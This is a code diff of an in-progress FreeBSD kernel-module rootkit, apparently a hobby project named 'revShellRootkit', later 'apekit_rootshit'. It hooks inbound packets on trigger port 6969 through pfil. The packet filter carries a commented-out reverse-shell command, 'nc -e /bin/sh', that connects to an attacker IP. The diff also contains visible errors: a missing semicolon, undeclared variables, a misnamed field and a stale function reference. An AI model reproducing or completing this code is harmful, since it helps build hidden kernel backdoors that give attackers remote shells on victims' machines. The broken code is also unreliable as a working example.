@@ -21,11 +21,14 @@
 // replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
 
-// pfil_head is a list of the all the filtering functions applied to incoming/outgoing packets
-// pfh_inet is the global IPv4 packet filtering subsystem
-static struct pfil_hook *my_hook;
+/*
+ * Global variables to hold references to our head and hook.
+ * We need these in order to unlink/unregister them during unload.
+ */
+static pfil_head_t g_ph    = NULL;
+static pfil_hook_t g_hook  = NULL;
 
-static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
+static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
     // struct mbuf *m = *mp;
     // struct ip *ip_header;
     // struct tcphdr *tcp_header;
@@ -71,9 +74,10 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
     //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
        // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
 
-    printf("Rootkit Working!\n");
-    printf("Rootkit Working!\n");
-    printf("Rootkit Working!\n");
+    log(LOG_NOTICE, "[Kernel Module] working!\n");
+    log(LOG_NOTICE, "[Kernel Module] working!\n");
+    log(LOG_NOTICE, "[Kernel Module] working!\n");
+
     //printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
     
@@ -82,28 +86,34 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 }
         
     
-   
-    
+static int load_head(void) {
+
+    struct pfil_head_args pha = {
+        .pa_version = PFIL_VERSION,
+        .pa_flags = 0,
+        .pa_type = PFIL_TYPE_AF,
+        .pa_headname = "custom_filter_apeshit"
+    };
+
+    g_ph = pfil_head_register(&pha);
+
+    if (g_ph == NULL) {
+        printf("[LKM] Could not register custom pfil_head\n");
+        return (ENOMEM);
+    }
+    printf("[LKM] Custom pfil_head registered: %s\n", pha.pha_headname);
+    return (0);
+};
 
 
 
-
-
-
-
-
-
-
-
-
-//good after here
 
 // Load function: Attach our packet filter
-static int load(void) {
+static int load_hook(void) {
 
-    struct pfil_hook_args pha = {
+    struct pfil_hook_args ha = {
         .pa_version = PFIL_VERSION,         // Version of the pfil framework
-        .pa_flags = PFIL_IN,     // Flags for filtering incoming and outgoing packets
+        .pa_flags = 0,                       /* Not specifying PFIL_IN/PFIL_OUT here */
         .pa_type = PFIL_TYPE_IP4,            // Type of filter (address family)
         .pa_mbuf_chk = packet_filter,       // Function to process packets
         .pa_mem_chk = NULL,                 // No memory-based checks (set to NULL if unused)
@@ -113,9 +123,9 @@ static int load(void) {
     };
 
     // pfil_hook_t	pfil_add_hook(struct pfil_hook_args *);
-    my_hook = pfil_add_hook(&pha);
+    g_hook = pfil_add_hook(&ha);
 
-    if (my_hook == NULL) {
+    if (g_hook == NULL) {
         // Handle error
         printf("mannnn that shit aint work");
         return (ENOMEM);
@@ -125,16 +135,50 @@ static int load(void) {
     return 0;
 }
 
+static int load_link(void) {
+
+    struct pfil_link_args la = {
+        .pa_version = PFIL_VERSION,
+        .pa_flags   = PFIL_IN | PFIL_HEADPTR | PFIL_HOOKPTR,
+        .pa_head    = g_ph,
+        .pa_hook    = g_hook,
+    };
+
+    int err = pfil_link(&la);
+    if (err != 0) {
+        printf("[LKM] pfil_link failed: %d\n", err);
+        return err;
+    }
+    printf("[LKM] pfil_link success for inbound packets\n");
+    return 0;
+}
+
+static void unload(void) {
+    if (g_hook) {
+        pfil_remove_hook(g_hook);
+        g_hook = NULL;
+        printf("[LKM] pfil_hook removed\n");
+    }
+    if (g_ph) {
+        pfil_head_unregister(g_ph);
+        g_ph = NULL;
+        printf("[LKM] pfil_head unregistered\n");
+    }
+}
 
 
 
 static int event_handler(struct module *module, int event, void *arg) {
     switch (event) {
         case MOD_LOAD:
-            return load();
+            load_head_case = load_head();
+            load_hook_case = load_hook();
+            load_link_case = load_link()
+            return 17;
         case MOD_UNLOAD:
-            // return unload();
-            return 5;
+            unload();
+            printf("[LKM] Module unloaded.\n");
+            return 82;
         default:
             return EOPNOTSUPP;
     }
@@ -142,7 +186,7 @@ static int event_handler(struct module *module, int event, void *arg) {
 
 
 static moduledata_t module_data = {
-    "revShellRootkit",
+    "apekit_rootshit",
     event_handler,
     NULL
 };
